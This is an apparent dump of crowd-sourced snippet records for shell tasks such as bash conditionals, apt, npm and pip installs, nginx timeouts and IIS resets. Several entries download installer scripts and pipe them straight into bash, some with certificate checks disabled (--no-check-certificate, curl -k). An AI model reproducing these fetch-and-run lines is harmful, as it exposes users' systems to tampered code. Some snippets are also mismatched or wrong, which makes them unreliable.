  {
    "id": 2656,
    "keyword": null,
    "link": null,
    "title": " if argument exists bash",
    "description": "if [ -z \"$1\" ]   then     echo \"No argument supplied\" fi  if [\"$1\" ]   then     echo \"Argument supplied is: \"$1 fi \n",
    "reg_date": "2021-10-11T22:07:38.000Z"
  },
  {
    "id": 2657,
    "keyword": null,
    "link": null,
    "title": " if argument supplied bash",
    "description": "if [ -z \"$1\" ]   then     echo \"No argument supplied\" fi  if [\"$1\" ]   then     echo \"Argument supplied is: \"$1 fi \n",
    "reg_date": "2021-10-11T22:07:38.000Z"
  },
  {
    "id": 2658,
    "keyword": null,
    "link": null,
    "title": " if dir bash",
    "description": "if [ -d \"$DIRECTORY\" ]; then   # Control will enter here if $DIRECTORY exists. fi\n",
    "reg_date": "2021-10-11T22:07:38.000Z"
  },
  {
    "id": 2659,
    "keyword": null,
    "link": null,
    "title": " if else in mac terminal",
    "description": "#!/bin/bash  defaultsReturn=$(defaults read com.apple.finder AppleShowAllFiles)  if [ '1' = \"$defaultsReturn\" ]; then     echo \"AppleShowAllFiles is enabled\" elif [ '0' = \"$defaultsReturn\" ]; then     echo \"AppleShowAllFiles is not enabled\" else     echo \"defaults returned some other value: $defaultsReturn\" fi \n",
    "reg_date": "2021-10-11T22:07:39.000Z"
  },
  {
    "id": 2660,
    "keyword": null,
    "link": null,
    "title": " if has bash",
    "description": "string='Hi substring' #To check if string has \"Mylong\" substring do if [[ $string == *\"substring\"* ]]; then   echo \"String has substring\" fi\n",
    "reg_date": "2021-10-11T22:07:39.000Z"
  },
  {
    "id": 2661,
    "keyword": null,
    "link": null,
    "title": " ifconfig command not found",
    "description": "sudo apt-get install net-tools or sudo ifconfig\napt-get install net-tools \n#installation $ sudo apt install net-tools  #Then use it $ ifconfig\nsudo yum install net-tools\n// Ubuntu sudo apt-get install net-tools\n",
    "reg_date": "2021-10-11T22:07:39.000Z"
  },
  {
    "id": 2662,
    "keyword": null,
    "link": null,
    "title": " ifconfig not found ubuntu",
    "description": "sudo apt-get install net-tools or sudo ifconfig\napt-get update apt-get install net-tools\n#installation $ sudo apt install net-tools  #Then use it $ ifconfig\nsudo yum install net-tools\n",
    "reg_date": "2021-10-11T22:07:39.000Z"
  },
  {
    "id": 2663,
    "keyword": null,
    "link": null,
    "title": " ifconfig not found ubuntu 20.04",
    "description": "#installation $ sudo apt install net-tools  #Then use it $ ifconfig\n",
    "reg_date": "2021-10-11T22:07:39.000Z"
  },
  {
    "id": 2664,
    "keyword": null,
    "link": null,
    "title": " ignore .idea files",
    "description": "Git never ignores changes to tracked files. As it appears as modified, the file  is under version control (the idea/workspace.xml file usually should not be)  and thus changes to it are tracked. Delete it from the index, leaving your  local copy intact with  git rm --cached .idea/workspace.xml   and commit this change. From then on it will be ignored unless you force-add it  back to the repository or change your gitignore settings.  # Remove the file from the repository git rm --cached .idea/  # now update your gitignore file to ignore this folder .idea/  # add the .gitignore file git add .gitignore  git commit -m \"Removed .idea files\" git push origin <branch>\n",
    "reg_date": "2021-10-11T22:07:40.000Z"
  },
  {
    "id": 2665,
    "keyword": null,
    "link": null,
    "title": " iis reset",
    "description": "iisreset\niisreset /stop /timeout:60 taskkill /F /FI \"SERVICES eq was\" iisreset /start\niisreset /noforce\niis reset\n",
    "reg_date": "2021-10-11T22:07:40.000Z"
  },
  {
    "id": 2666,
    "keyword": null,
    "link": null,
    "title": " iis stop",
    "description": "iisreset /stop\n",
    "reg_date": "2021-10-11T22:07:40.000Z"
  },
  {
    "id": 2667,
    "keyword": null,
    "link": null,
    "title": " iisreset",
    "description": "iisreset /stop /timeout:60 taskkill /F /FI \"SERVICES eq was\" iisreset /start\niisreset /noforce\niis reset\n",
    "reg_date": "2021-10-11T22:07:40.000Z"
  },
  {
    "id": 2668,
    "keyword": null,
    "link": null,
    "title": " import password chrome csv",
    "description": "In Chrome address bar:\t\t\t\t'chrome://flags' > 'Password import' > Select 'Enabled' in dropdown menu > Relaunch ... (top-right) > 'Settings' > 'Passwords' ... (Saved Passwords) > 'Import' > Select your CSV file\nGoto :- chrome://flags/ Enable:- Password import Import functionality in password settings. &ndash; Mac, Windows, Linux, Chrome OS, Android\n",
    "reg_date": "2021-10-11T22:07:41.000Z"
  },
  {
    "id": 2669,
    "keyword": null,
    "link": null,
    "title": " import tensorflow as tf ModuleNotFoundError: No module named 'tensorflow'",
    "description": "conda create -n tensorflow python=3.5 activate tensorflow pip install --ignore-installed --upgrade tensorflow\npip install tensorflow==1.2.0 --ignore-installed\n!pip install -q git+https://github.com/tensorflow/examples.git\npip install git+https://github.com/tensorflow/docs\n#if you are using bert its only comaptible with python 2.7/pip2  #and tensorflow 1.15.0 so you need to install like so pip2 install tensorflow==1.15.0 --ignore-installed  #also if you have a gpu  pip2 install tensorflow-gpu==1.15.0 --ignore-installed\n",
    "reg_date": "2021-10-11T22:07:41.000Z"
  },
  {
    "id": 2670,
    "keyword": null,
    "link": null,
    "title": " improve ubuntu 16.04 performance",
    "description": "sudo apt-get install preload\n",
    "reg_date": "2021-10-11T22:07:41.000Z"
  },
  {
    "id": 2671,
    "keyword": null,
    "link": null,
    "title": " imultis install",
    "description": "pip install imutils\n",
    "reg_date": "2021-10-11T22:07:41.000Z"
  },
  {
    "id": 2672,
    "keyword": null,
    "link": null,
    "title": " increase nginx timeout",
    "description": "step 1:  $sudo nano /etc/nginx/nginx.conf step 2:  add following config to http section and save it. http {    ...    proxy_read_timeout 300;    proxy_connect_timeout 300;    proxy_send_timeout 300;     ... } step 3:  $sudo service nginx reload\nhttp {      fastcgi_read_timeout 300;      proxy_read_timeout 300; } \n",
    "reg_date": "2021-10-11T22:07:41.000Z"
  },
  {
    "id": 2673,
    "keyword": null,
    "link": null,
    "title": " increase no of watchers",
    "description": "echo fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf sudo sysctl -p\n",
    "reg_date": "2021-10-11T22:07:42.000Z"
  },
  {
    "id": 2674,
    "keyword": null,
    "link": null,
    "title": " increase ssh session timeout linux",
    "description": " ssh -o ServerAliveInterval=60 -i Firstme.pem ec2-user@3.90.84.197\n#Add these lines on sshd_config  ClientAliveInterval 120 ClientAliveCountMax 720 \n",
    "reg_date": "2021-10-11T22:07:42.000Z"
  },
  {
    "id": 2675,
    "keyword": null,
    "link": null,
    "title": " increment number bash",
    "description": "i=$((i+1)) ((i=i+1)) let \"i=i+1\" \n",
    "reg_date": "2021-10-11T22:07:42.000Z"
  },
  {
    "id": 2676,
    "keyword": null,
    "link": null,
    "title": " increment variable in batch file",
    "description": "set /a var = var + 1\n",
    "reg_date": "2021-10-11T22:07:42.000Z"
  },
  {
    "id": 2677,
    "keyword": null,
    "link": null,
    "title": " indicator stickynotes",
    "description": "sudo add-apt-repository ppa:umang/indicator-stickynotes sudo apt-get update sudo apt-get install indicator-stickynotes\n",
    "reg_date": "2021-10-11T22:07:42.000Z"
  },
  {
    "id": 2678,
    "keyword": null,
    "link": null,
    "title": " initialize nx",
    "description": "npm init nx-workspace test_name\n",
    "reg_date": "2021-10-11T22:07:42.000Z"
  },
  {
    "id": 2679,
    "keyword": null,
    "link": null,
    "title": " initialize nx environment",
    "description": "npm init nx-workspace test_name\n",
    "reg_date": "2021-10-11T22:07:43.000Z"
  },
  {
    "id": 2680,
    "keyword": null,
    "link": null,
    "title": " input bash",
    "description": "# fullname=\"USER INPUT\" read -p \"Enter fullname: \" fullname # user=\"USER INPUT\" read -p \"Enter user: \" user \n#!/bin/bash # Ask the user for their name echo Hello, who am I talking to? read varname echo It\\'s nice to meet you $varname\nread -p \"Enter your name : \" name echo $name\necho \"Synchronize repositories? Y/N\" read ANSWER\n",
    "reg_date": "2021-10-11T22:07:43.000Z"
  },
  {
    "id": 2681,
    "keyword": null,
    "link": null,
    "title": " insall git onec2",
    "description": "$ sudo yum install git\n",
    "reg_date": "2021-10-11T22:07:43.000Z"
  },
  {
    "id": 2682,
    "keyword": null,
    "link": null,
    "title": " instal .deb ubuntu",
    "description": "sudo dpkg -i /path/to/deb/file sudo apt-get install -f\nsudo dpkg -i package_file.deb\nsudo apt install ./file_name.deb\nsudo apt install path_to_deb_file\n",
    "reg_date": "2021-10-11T22:07:43.000Z"
  },
  {
    "id": 2683,
    "keyword": null,
    "link": null,
    "title": " instalacion sdkman",
    "description": "$ curl -s \"https://get.sdkman.io\" | bash\n",
    "reg_date": "2021-10-11T22:07:43.000Z"
  },
  {
    "id": 2684,
    "keyword": null,
    "link": null,
    "title": " instalar docker compose ubuntu",
    "description": "sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.26.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose \nsudo systemctl start docker \n",
    "reg_date": "2021-10-11T22:07:44.000Z"
  },
  {
    "id": 2685,
    "keyword": null,
    "link": null,
    "title": " install-lamp-stack-ubuntu-20-04-server-desktop",
    "description": "systemctl status apache2\nsudo apt install -y apache2 apache2-utils\nsudo apt update  sudo apt upgrade\nsudo ufw allow http\nsudo chown www-data:www-data /var/www/html/ -R\nsudo iptables -I INPUT -p tcp --dport 80 -j ACCEPT\nsudo a2enconf servername.conf\n",
    "reg_date": "2021-10-11T22:07:44.000Z"
  },
  {
    "id": 2686,
    "keyword": null,
    "link": null,
    "title": " install @angular/core",
    "description": "npm i @angular/core\n# if during the generation of a new angular project an error occurs #the dependencies needed might not be installed. #to reinstall them in the already created project:  cd [project-name] npm i @angular/core npm i @angular/platform-browser  npm install tslib\n",
    "reg_date": "2021-10-11T22:07:44.000Z"
  },
  {
    "id": 2687,
    "keyword": null,
    "link": null,
    "title": " install @angular/router",
    "description": "npm i @angular/router\n",
    "reg_date": "2021-10-11T22:07:44.000Z"
  },
  {
    "id": 2688,
    "keyword": null,
    "link": null,
    "title": " install .deb file in ubuntu",
    "description": "sudo dpkg -i /path/to/deb/file sudo apt-get install -f\nsudo dpkg -i package_file.deb\n#install downloaded .deb sudo dpkg -i /path/name.deb  #install packages sudo apt install package_name\n",
    "reg_date": "2021-10-11T22:07:44.000Z"
  },
  {
    "id": 2689,
    "keyword": null,
    "link": null,
    "title": " install .deb files in terminal linux",
    "description": "sudo dpkg -i /path/to/deb/file sudo apt-get install -f\n",
    "reg_date": "2021-10-11T22:07:45.000Z"
  },
  {
    "id": 2690,
    "keyword": null,
    "link": null,
    "title": " install Qt5 ubuntu 20.04",
    "description": "sudo apt-get install build-essential sudo apt-get install qtcreator sudo apt-get install qt5-default\n",
    "reg_date": "2021-10-11T22:07:45.000Z"
  },
  {
    "id": 2691,
    "keyword": null,
    "link": null,
    "title": " install Scout in ubuntu",
    "description": "Step 1 : Unzip Scout-App Step 2 : Open terminal Step 3 : cd Scout-App Step 4 : sudo apt-get install libgconf-2-4 Step 5 : ./Scout-app\n",
    "reg_date": "2021-10-11T22:07:45.000Z"
  },
  {
    "id": 2692,
    "keyword": null,
    "link": null,
    "title": " install   git flow",
    "description": "For Windows  $ wget -q -O - --no-check-certificate https://github.com/nvie/gitflow/raw/develop/contrib/gitflow-installer.sh | bash For Mac  brew install git-flow For Linux yay -S gitflow-avh\n",
    "reg_date": "2021-10-11T22:07:45.000Z"
  },
  {
    "id": 2693,
    "keyword": null,
    "link": null,
    "title": " install adonis cli",
    "description": "npm i -g @adonisjs/cli\n> npm i -g @adonisjs/cli\n",
    "reg_date": "2021-10-11T22:07:45.000Z"
  },
  {
    "id": 2694,
    "keyword": null,
    "link": null,
    "title": " install amplify",
    "description": "npm install -g @aws-amplify/cli\n",
    "reg_date": "2021-10-11T22:07:45.000Z"
  },
  {
    "id": 2695,
    "keyword": null,
    "link": null,
    "title": " install amplify cli mac",
    "description": "npm install -g @aws-amplify/cli\n",
    "reg_date": "2021-10-11T22:07:46.000Z"
  },
  {
    "id": 2696,
    "keyword": null,
    "link": null,
    "title": " install and configure nginx centos 7",
    "description": "sudo yum &ndash;y install nginx\n",
    "reg_date": "2021-10-11T22:07:46.000Z"
  },
  {
    "id": 2697,
    "keyword": null,
    "link": null,
    "title": " install and use beego easily",
    "description": "go env -w GO111MODULE=on  go get -u github.com/beego/beego/v2 go get -u github.com/beego/bee/v2  # then use the following command to create new bee project bee new hello cd hello go mod tidy # run this to download needed packages bee run # now site will be available on port 8080\n",
    "reg_date": "2021-10-11T22:07:46.000Z"
  },
  {
    "id": 2698,
    "keyword": null,
    "link": null,
    "title": " install android repo",
    "description": "mkdir ~/bin curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo chmod a+x ~/bin/repo export PATH=~/bin:$PATH\n",
    "reg_date": "2021-10-11T22:07:46.000Z"
  },
  {
    "id": 2699,
    "keyword": null,
    "link": null,
    "title": " install android studio on linux mint",
    "description": "sudo apt update sudo apt install snapd  sudo snap install android-studio --classic\n",
    "reg_date": "2021-10-11T22:07:46.000Z"
  },
  {
    "id": 2700,
    "keyword": null,
    "link": null,
    "title": " install angular 9.1.7",
    "description": "npm i -g @angular/cli@9.1.7\n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2701,
    "keyword": null,
    "link": null,
    "title": " install angular animation 10.0.12",
    "description": "npm i @angular/animations@10.0.12\n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2702,
    "keyword": null,
    "link": null,
    "title": " install angular bootstrap",
    "description": "# From project directory: npm install --save bootstrap npm install --save jquery  # Now edit `angular.json` # Position: `projects -> architect -> build -> options` # To `styles`, add \"node_modules/bootstrap/dist/css/bootstrap.css\" # To `scripts`, #   add \"node_modules/jquery/dist/jquery.js\" #   and also \"node_modules/bootstrap/dist/js/bootstrap.js\" # Test with # <<div class=\"alert alert-primary\" role=\"alert\"> Bootstrap alert</div>\nFrom angular cli:  npm install --save bootstrap npm install --save jquery  Then add the following paths to angular.json:  \"node_modules/bootstrap/dist/css/bootstrap.css\" in the projects -> architect -> build -> styles array \"node_modules/jquery/dist/jquery.js\" in the projects -> architect -> build -> scripts array \"node_modules/bootstrap/dist/js/bootstrap.js\" in the projects -> architect -> build -> scripts array \nnpm install --save bootstrap\n....      \"styles\": [        \"node_modules/bootstrap/dist/css/bootstrap.min.css\",        \"src/styles.css\"      ],      \"scripts\": [          \"node_modules/jquery/dist/jquery.min.js\",          \"node_modules/bootstrap/dist/js/bootstrap.min.js\"      ].....\n $ npm install --save bootstrap\n$ npm install bootstrap \n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2703,
    "keyword": null,
    "link": null,
    "title": " install angular cdk",
    "description": "npm i @angular/cdk --save\nnpm install --save @angular/material @angular/cdk @angular/animations \n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2704,
    "keyword": null,
    "link": null,
    "title": " install angular cli",
    "description": "npm install -g @angular/cli ng new my-dream-app cd my-dream-app ng serve\nnpm install -g @angular/cli@6.1.1\n               content_copy              npm install -g @angular/cli     \nnpm install -g @angular/cli    //make sure you have node/npm installed  ng new <appname>        //  eg:  ng new my-app cd <appname>       // cd my-app ng serve\nInstall Specific Version (Example: 6.1.1) npm install -g @angular/cli@6.1.1\nnpm install -g @angular/cli ng new my-app cd my-app ng serve\n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2705,
    "keyword": null,
    "link": null,
    "title": " install angular cli specific version",
    "description": "npm install -g @angular/cli@6.1.1\nnpm uninstall -g angular-cli npm cache clean npm install -g angular-cli@1.0.0 \n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2706,
    "keyword": null,
    "link": null,
    "title": " install angular material",
    "description": "ng add @angular/material\nnpm i @angular/material\nng add @angular/material \n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2707,
    "keyword": null,
    "link": null,
    "title": " install ansible in ubuntu",
    "description": "$ sudo apt update $ sudo apt install software-properties-common $ sudo add-apt-repository --yes --update ppa:ansible/ansible $ sudo apt install ansible \nOn Fedora: $ sudo dnf install ansible  On RHEL and CentOS: $ sudo yum install ansible  On Ubuntu: $ sudo apt-add-repository --yes --update ppa:ansible/ansible $ sudo apt install ansible  Using PIP: $ pip install --user ansible  On Alpine: $ apk add ansible \nOn Fedora: $ sudo dnf install ansible  On RHEL and CentOS: $ sudo yum install ansible  On Ubuntu: $ sudo apt-add-repository --yes --update ppa:ansible/ansible $ sudo apt install ansible  Using PIP: $ pip install --user ansible  On Alpine: $ apk add ansible  sudo apt install ansible \n",
    "reg_date": "2021-10-11T22:07:47.000Z"
  },
  {
    "id": 2708,
    "keyword": null,
    "link": null,
    "title": " install ansible on ubuntu 18.04",
    "description": "$ sudo apt update $ sudo apt install software-properties-common $ sudo add-apt-repository --yes --update ppa:ansible/ansible $ sudo apt install ansible \nOn Fedora: $ sudo dnf install ansible  On RHEL and CentOS: $ sudo yum install ansible  On Ubuntu: $ sudo apt-add-repository --yes --update ppa:ansible/ansible $ sudo apt install ansible  Using PIP: $ pip install --user ansible  On Alpine: $ apk add ansible  sudo apt install ansible \n$ apk add ansible\n[root@ansible ~]# yum install epel-release -y\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2709,
    "keyword": null,
    "link": null,
    "title": " install antd",
    "description": "npm install antd\nFollowing the Ant Design specification, we developed a React UI library antd that contains a set of high quality components and demos for building rich, interactive user interfaces.  \"https://ant.design/\"\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2710,
    "keyword": null,
    "link": null,
    "title": " install anydesk ubuntu",
    "description": "wget -qO - https://keys.anydesk.com/repos/DEB-GPG-KEY | sudo apt-key add -  echo \"deb http://deb.anydesk.com/ all main\" > sudo /etc/apt/sources.list.d/anydesk-stable.list  sudo apt update  sudo apt install anydesk\napt install anydesk\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2711,
    "keyword": null,
    "link": null,
    "title": " install apache on ubuntu 20.04",
    "description": "sudo apt update  sudo apt install apache2  sudo ufw allow 'Apache' \n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2712,
    "keyword": null,
    "link": null,
    "title": " install apollo",
    "description": "npm install @apollo/client graphql  # yarn yarn add @apollo/client graphql\nnpm install apollo-server graphql  # yarn  yarn add apollo-server graphql\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2713,
    "keyword": null,
    "link": null,
    "title": " install apt-cyg",
    "description": "wget rawgit.com/transcode-open/apt-cyg/master/apt-cyg && \\ install apt-cyg /bin && \\ rm apt-cyg  # OR  curl -kL rawgit.com/transcode-open/apt-cyg/master/apt-cyg > apt-cyg && \\ install apt-cyg /bin && \\ rm apt-cyg\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2714,
    "keyword": null,
    "link": null,
    "title": " install atom ubuntu terminal",
    "description": "Install in terminal  Step 1 : Add repository from official Atom Site wget -qO - https://packagecloud.io/AtomEditor/atom/gpgkey | sudo apt-key add - sudo sh -c 'echo \"deb [arch=amd64] https://packagecloud.io/AtomEditor/atom/any/ any main\" > /etc/apt/sources.list.d/atom.list' Press Enter if it ask your permission.  Step 2 : Update the Ubuntu System sudo apt-get update It will take some time. Be patient.  Step 3 : Install Atom Editor sudo apt-get install atom\n# Install Atom sudo apt-get install atom # Install Atom Beta sudo apt-get install atom-beta \n# Install Atom sudo dpkg -i atom-amd64.deb # Install Atom's dependencies if they are missing sudo apt-get -f install \n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2715,
    "keyword": null,
    "link": null,
    "title": " install auth in laravel 8 with bootstrap",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\n// How to install bootstrap in laravel with Auth  composer require laravel/ui php artisan ui bootstrap --auth npm install npm run dev\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2716,
    "keyword": null,
    "link": null,
    "title": " install autopep8",
    "description": "$ pip install --upgrade autopep8 \n$ autopep8 --in-place --aggressive --aggressive <filename>\n",
    "reg_date": "2021-10-11T22:07:48.000Z"
  },
  {
    "id": 2717,
    "keyword": null,
    "link": null,
    "title": " install avro on linix",
    "description": "sudo apt install git libibus-1.0-dev automake autoconf make gjs ibus  git clone git://github.com/sarim/ibus-avro.git cd ibus-avro aclocal && autoconf && automake --add-missing ./configure --prefix=/usr sudo make install   #Select an input method -> Bengali -> Avro\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2718,
    "keyword": null,
    "link": null,
    "title": " install avro on linux ubuntu",
    "description": "sudo apt-get install ibus-avro \nsudo apt install git libibus-1.0-dev automake autoconf make gjs ibus  git clone git://github.com/sarim/ibus-avro.git cd ibus-avro aclocal && autoconf && automake --add-missing ./configure --prefix=/usr sudo make install   #Select an input method -> Bengali -> Avro\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2719,
    "keyword": null,
    "link": null,
    "title": " install aws cli 2 yum",
    "description": "curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" unzip awscliv2.zip sudo ./aws/install -i /usr/local/aws-cli -b /usr/local/bin\ncurl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" sudo yum install -y unzip unzip awscliv2.zip sudo ./aws/install -i /usr/local/aws-cli -b /usr/local/bin\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2720,
    "keyword": null,
    "link": null,
    "title": " install babel command line",
    "description": "npm i -D @babel/core @babel/preset-env babel-loader\n$ sudo apt-cache search texlive french  texlive-doc-fr - TeX Live: French documentation  texlive-lang-french - TeX Live: French  $sudo apt-get install texlive-lang-french\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2721,
    "keyword": null,
    "link": null,
    "title": " install babel core",
    "description": "npm install --save-dev @babel/core\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2722,
    "keyword": null,
    "link": null,
    "title": " install babel loader",
    "description": "npm i -D @babel/core @babel/preset-env babel-loader\nnpm install --save-dev babel-loader\nnpm install -D babel-loader @babel/core @babel/preset-env webpack\nmodule: {   rules: [     {       test: /\\.m?js$/,       exclude: /(node_modules|bower_components)/,       use: {         loader: 'babel-loader',         options: {           presets: ['@babel/preset-env']         }       }     }   ] }\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2723,
    "keyword": null,
    "link": null,
    "title": " install beautifulsoup windows",
    "description": "pip install beautifulsoup4\npip install bs4 #this'll do the work\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2724,
    "keyword": null,
    "link": null,
    "title": " install boostrap react",
    "description": "//1.run following commnad in cmd: npm install bootstrap --save //you can now use bootstrap component. example: import { Button } from 'react-bootstrap';  //2.or  add this to index.js: <link   rel=\"stylesheet\"   href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css\"   integrity=\"sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l\"   crossorigin=\"anonymous\" />\n{/* The following line can be included in your src/index.js or App.js file*/}  import 'bootstrap/dist/css/bootstrap.min.css';\nnpm install react-bootstrap bootstrap\n",
    "reg_date": "2021-10-11T22:07:49.000Z"
  },
  {
    "id": 2725,
    "keyword": null,
    "link": null,
    "title": " install bootstrap",
    "description": "<!-- Bootstrap 5 beta 1 --> <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1\" crossorigin=\"anonymous\">\n<!-- Boostrap 4 CSS --> <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css\" integrity=\"sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh\" crossorigin=\"anonymous\"> <script src=\"https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js\" integrity=\"sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6\" crossorigin=\"anonymous\"></script>  <!-- Boostrap JS --> <script src=\"https://code.jquery.com/jquery-3.4.1.slim.min.js\" integrity=\"sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n\" crossorigin=\"anonymous\"></script> <script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\" integrity=\"sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo\" crossorigin=\"anonymous\"></script>\nnpm install bootstrap //OR npm install bootstrap@latest\nnpm install bootstrap@latest\npip install bootstrap-py pip install django-bootstrap3 \nnpm install bootstrap\n",
    "reg_date": "2021-10-11T22:07:50.000Z"
  },
  {
    "id": 2726,
    "keyword": null,
    "link": null,
    "title": " install bootstrap 4 npm",
    "description": "npm install bootstrap //OR npm install bootstrap@latest\nnpm install bootstrap@latest\nnpm install bootstrap@3.3.7 --save \n$ npm install bootstrap@3\n",
    "reg_date": "2021-10-11T22:07:50.000Z"
  },
  {
    "id": 2727,
    "keyword": null,
    "link": null,
    "title": " install bootstrap angular",
    "description": "npm install bootstrap npm install jquery   Add this to angular.json  \"styles\": [               \"node_modules/bootstrap/dist/css/bootstrap.css\",               \"src/styles.css\"             ],             \"scripts\": [               \"node_modules/bootstrap/dist/js/bootstrap.js\",               \"node_modules/jquery/dist/jquery.js\"             ]\n# From project directory: npm install --save bootstrap npm install --save jquery  # Now edit `angular.json` # Position: `projects -> architect -> build -> options` # To `styles`, add \"node_modules/bootstrap/dist/css/bootstrap.css\" # To `scripts`, #   add \"node_modules/jquery/dist/jquery.js\" #   and also \"node_modules/bootstrap/dist/js/bootstrap.js\" # Test with # <<div class=\"alert alert-primary\" role=\"alert\"> Bootstrap alert</div>\n@import \"~bootstrap/dist/css/bootstrap.css\"   \"styles\": [               \"./node_modules/bootstrap/dist/css/bootstrap.css\",               \"src/styles.css\"                           ],\nFrom angular cli:  npm install --save bootstrap npm install --save jquery  Then add the following paths to angular.json:  \"node_modules/bootstrap/dist/css/bootstrap.css\" in the projects -> architect -> build -> styles array \"node_modules/jquery/dist/jquery.js\" in the projects -> architect -> build -> scripts array \"node_modules/bootstrap/dist/js/bootstrap.js\" in the projects -> architect -> build -> scripts array \nnpm install --save bootstrap\ninstall bootstrap angular\n",
    "reg_date": "2021-10-11T22:07:50.000Z"
  },
  {
    "id": 2728,
    "keyword": null,
    "link": null,
    "title": " install bootstrap in angular 9",
    "description": "npm install bootstrap npm install jquery   Add this to angular.json  \"styles\": [               \"node_modules/bootstrap/dist/css/bootstrap.css\",               \"src/styles.css\"             ],             \"scripts\": [               \"node_modules/bootstrap/dist/js/bootstrap.js\",               \"node_modules/jquery/dist/jquery.js\"             ]\n# From project directory: npm install --save bootstrap npm install --save jquery  # Now edit `angular.json` # Position: `projects -> architect -> build -> options` # To `styles`, add \"node_modules/bootstrap/dist/css/bootstrap.css\" # To `scripts`, #   add \"node_modules/jquery/dist/jquery.js\" #   and also \"node_modules/bootstrap/dist/js/bootstrap.js\" # Test with # <<div class=\"alert alert-primary\" role=\"alert\"> Bootstrap alert</div>\nFrom angular cli:  npm install --save bootstrap npm install --save jquery  Then add the following paths to angular.json:  \"node_modules/bootstrap/dist/css/bootstrap.css\" in the projects -> architect -> build -> styles array \"node_modules/jquery/dist/jquery.js\" in the projects -> architect -> build -> scripts array \"node_modules/bootstrap/dist/js/bootstrap.js\" in the projects -> architect -> build -> scripts array \nnpm install bootstrap ---------------------- @import \"~bootstrap/dist/css/bootstrap.css\"   \"styles\": [               \"./node_modules/bootstrap/dist/css/bootstrap.css\",               \"src/styles.css\"                   ],       \nnpm install bootstrap --save\nnpm install --save bootstrap\n",
    "reg_date": "2021-10-11T22:07:50.000Z"
  },
  {
    "id": 2729,
    "keyword": null,
    "link": null,
    "title": " install brave browser on linux",
    "description": "sudo apt install apt-transport-https curl gnupg  curl -s https://brave-browser-apt-release.s3.brave.com/brave-core.asc | sudo apt-key --keyring /etc/apt/trusted.gpg.d/brave-browser-release.gpg add -  echo \"deb [arch=amd64] https://brave-browser-apt-release.s3.brave.com/ stable main\" | sudo tee /etc/apt/sources.list.d/brave-browser-release.list  sudo apt update  sudo apt install brave-browser\n",
    "reg_date": "2021-10-11T22:07:50.000Z"
  },
  {
    "id": 2730,
    "keyword": null,
    "link": null,
    "title": " install brave on linux using snap",
    "description": "sudo snap install brave\n",
    "reg_date": "2021-10-11T22:07:50.000Z"
  },
  {
    "id": 2731,
    "keyword": null,
    "link": null,
    "title": " install c++ ubuntu",
    "description": "$ sudo apt install g++  g++ -o hello hello.cc ./hello\n",
    "reg_date": "2021-10-11T22:07:51.000Z"
  },
  {
    "id": 2732,
    "keyword": null,
    "link": null,
    "title": " install c ubuntu",
    "description": "sudo apt install build-essential\n",
    "reg_date": "2021-10-11T22:07:51.000Z"
  },
  {
    "id": 2733,
    "keyword": null,
    "link": null,
    "title": " install camera in linux",
